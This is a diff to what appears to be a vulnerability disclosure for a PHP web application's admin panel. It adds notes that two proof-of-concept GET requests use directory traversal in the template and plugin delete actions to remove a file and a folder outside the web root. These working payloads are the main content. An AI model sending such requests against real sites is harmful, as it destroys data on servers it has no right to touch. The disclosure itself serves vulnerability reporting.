@@ -46,12 +46,14 @@ So create a test folder outside the web application and perform directory traver
 
 Try running the payload to delete:
 The template interface successfully deleted 111.txt
+use GET request:
 http://localhost/admin/template.php?action=del&tpl=../../../test/111.txt&token=a4539d9677172ad9e96c7e02ebac0956f00babc9
 
 <img width="415" height="232" alt="image" src="https://github.com/user-attachments/assets/0889bda6-8f4a-4b34-8df6-7db0fc12f06f" />
 
 
 The plugin interface successfully deleted the test folder:
+use GET request:
 http://localhost/admin/plugin.php?action=del&plugin=../../../test/&token=a4539d9677172ad9e96c7e02ebac0956f00babc9
 
 <img width="416" height="259" alt="image" src="https://github.com/user-attachments/assets/29cafc98-f366-4a06-9ae9-8197b27d8527" />
